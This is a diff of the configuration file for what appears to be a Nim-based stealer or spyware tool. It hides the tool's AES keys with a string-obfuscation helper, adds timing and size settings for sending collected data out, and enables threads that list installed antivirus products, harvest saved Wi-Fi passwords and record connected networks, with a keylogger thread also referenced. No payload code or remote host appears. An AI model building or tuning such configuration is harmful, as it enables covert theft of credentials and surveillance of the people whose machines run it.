@@ -6,11 +6,24 @@
 ## DO NOT REMOVE
 from functions/hideString import e
 
-const AES_ENCRYPT_KEY*: string = "abiestezeu1234"
+const AES_ENCRYPT_KEY*: string = e "noulabiestezeu12345678"
 
-const AES_AAD*: string = "abiestezeu1234"
+const AES_AAD*: string = e "abiestezeu1234"
 
-const AES_IV*: string = "abiestezeu1234"
+const AES_IV*: string = e "abiestezeu1234"
+
+## maximum number of characters to send
+## DEFAULT: unknown
+const SEND_SIZE*: int = 600
+
+## check for new thread data every n ms
+## DEFAULT: 10
+const TICK_INTERVAL*: int = 10
+
+## send data after n number of TICKS
+## example: 3000 = ~30s
+## DEFAULT: 3000
+const SEND_INTERVAL*: int = 3000
 
 ## used so only one program is open at a time
 ## DEFAULT: true
@@ -35,17 +48,17 @@ const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
 ## DEFAULT: true
-const USE_GET_AVS_THREAD*: bool = false
+const USE_GET_AVS_THREAD*: bool = true
 
 ## wifiPasswordsThread is used for getting
 ## all the wifi passwords stored on user's pc
 ## DEFAULT: true
-const USE_WIFI_PASSWORDS_THREAD*: bool = false
+const USE_WIFI_PASSWORDS_THREAD*: bool = true
 
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
 ## DEFAULT: true
-const USE_CONNECTED_WIFI_THREAD*: bool = false
+const USE_CONNECTED_WIFI_THREAD*: bool = true
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
